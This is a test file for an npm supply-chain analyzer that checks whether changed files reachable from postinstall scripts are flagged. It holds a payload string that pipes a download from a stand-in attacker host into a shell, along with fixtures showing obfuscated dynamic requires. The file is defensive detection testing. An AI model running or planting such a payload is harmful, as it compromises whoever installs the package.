import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const evil = "require('child_process').execSync('curl https://evil.example | sh')\n";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const e1: Record<string, string> = {
  "package.json": pj({ postinstall: "node scripts/install.js" }),
  "scripts/install.js": "const p=require('path');require(p.join(__dirname,'..','lib',process.platform+'.js'))\n",
  "lib/darwin.js": "1\n",
  "lib/linux.js": "1\n",
  "src/x.js": "1\n",
  "test/z.js": "1\n",
  "README.md": "a\n",
};
const e2: Record<string, string> = {
  "package.json": pj({ postinstall: "node install.js" }),
  "install.js": "require(Buffer.from('Li9saWIvYS5qcw==','base64').toString())\n",
  "lib/a.js": "1\n",
  "test/z.js": "1\n",
  "README.md": "a\n",
};
const e3: Record<string, string> = {
  "package.json": pj({ postinstall: "node scripts/install.js" }),
  "scripts/install.js": "const n='run';require('child_process').fork(require('path').resolve(__dirname,'../tools/'+n+'.js'))\n",
  "tools/run.js": "1\n",
  "src/x.js": "1\n",
  "test/z.js": "1\n",
  "README.md": "a\n",
};
const e4: Record<string, string> = {
  "package.json": pj({ postinstall: "node install.js" }),
  "install.js": "const x='fixture';require('./test/'+x+'.js')\n",
  "test/fixture.js": "1\n",
  "other.js": "1\n",
  "lib/a.js": "1\n",
  "README.md": "a\n",
};

test("E1 a prefix that leaves the entry directory holds the package except docs and tests", () => {
  holds(e1, "lib/darwin.js", evil);
  holds(e1, "src/x.js", evil);
  expect(hard(e1, { ...e1, "test/z.js": evil })).toEqual([]);
  expect(hard(e1, { ...e1, "README.md": "b\n" })).toEqual([]);
});

test("E2 a base64 name holds the package except docs, including tests", () => {
  holds(e2, "lib/a.js", evil);
  holds(e2, "test/z.js", evil);
  expect(hard(e2, { ...e2, "README.md": "b\n" })).toEqual([]);
});

test("E3 a fork whose prefix leaves the entry directory holds that file and not docs or tests", () => {
  holds(e3, "tools/run.js", evil);
  holds(e3, "src/x.js", evil);
  expect(hard(e3, { ...e3, "test/z.js": evil })).toEqual([]);
  expect(hard(e3, { ...e3, "README.md": "b\n" })).toEqual([]);
});

test("E4 a prefix inside the entry directory holds that directory only", () => {
  holds(e4, "test/fixture.js", evil);
  expect(hard(e4, { ...e4, "other.js": evil })).toEqual([]);
  expect(hard(e4, { ...e4, "lib/a.js": evil })).toEqual([]);
  expect(hard(e4, { ...e4, "README.md": "b\n" })).toEqual([]);
});

test("an unbounded eval holds docs, and a package-name require does not", () => {
  const wide = {
    "package.json": pj({ postinstall: "node install.js" }),
    "install.js": "eval(code)\n",
    "docs/x.js": "1\n",
    "README.md": "a\n",
  };
  holds(wide, "docs/x.js", evil);
  holds(wide, "README.md", "b\n");
  const copied = {
    "package.json": pj({ postinstall: "node scripts/postinstall.js" }),
    "scripts/postinstall.js": "require('./utils')\n",
    "scripts/utils.js": "function loadModule(name){return require(name)}\nconst path=require('path');const fs=require('fs');const dir=path.resolve(__dirname,'..','lib');fs.copyFileSync(path.join(dir,'index.cjs'),path.join(dir,'index.cjs'))\n",
    "lib/index.cjs": "1\n",
    "lib/index.iife.js": "1\n",
    "README.md": "a\n",
  };
  expect(hard(copied, { ...copied, "lib/index.iife.js": "2\n" })).toEqual([]);
  expect(hard(copied, { ...copied, "README.md": "b\n" })).toEqual([]);
});

test("a package resolve used to read package.json does not widen to an unnamed readme", () => {
  const base = {
    "package.json": pj({ postinstall: "node postinstall.js" }),
    "postinstall.js": "const path=require('path');const cp=require('child_process');const {version}=require(path.join(path.dirname(require.resolve('@swc/core')),'package.json'));cp.execSync('npm -v')\n",
    "README.md": "a\n",
    "index.js": "1\n",
  };
  expect(hard(base, { ...base, "README.md": "b\n" })).toEqual([]);
});
